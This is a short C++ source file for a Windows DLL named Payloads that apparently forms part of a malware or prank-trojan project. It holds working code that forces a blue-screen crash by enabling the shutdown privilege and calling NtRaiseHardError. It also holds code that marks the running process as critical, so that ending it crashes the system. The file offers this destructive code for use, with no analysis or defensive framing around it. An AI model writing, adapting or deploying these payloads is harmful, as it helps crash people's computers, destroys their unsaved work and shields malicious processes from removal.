// Payloads.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"
#include "Payloads.h"

namespace Payloads {

	void GetDesktopResolution(int& w, int& h) { RECT desktop; const HWND hDesktop = GetDesktopWindow(); GetWindowRect(hDesktop, &desktop); w = desktop.right; h = desktop.bottom; }

	void Payloads::BSOD()
	{
		BOOLEAN prev; unsigned long response; DWORD error = 0xDEADDEAD;

		RtlAdjustPrivilege(19, 1, 0, &prev);
		NtRaiseHardError(error, 0, 0, 0, 6, &response);
	}

	bool Payloads::CriticalMode(ULONG a)
	{
		// 1 = on 0 = off
		BOOLEAN prev;
		RtlAdjustPrivilege(20, 1, 0, &prev);
		if (!NtSetInformationProcess((HANDLE)-1, 0x1d, &a, sizeof(ULONG)))
		{
			return TRUE;
		}
		else
		{
			return FALSE;
		}
	}
}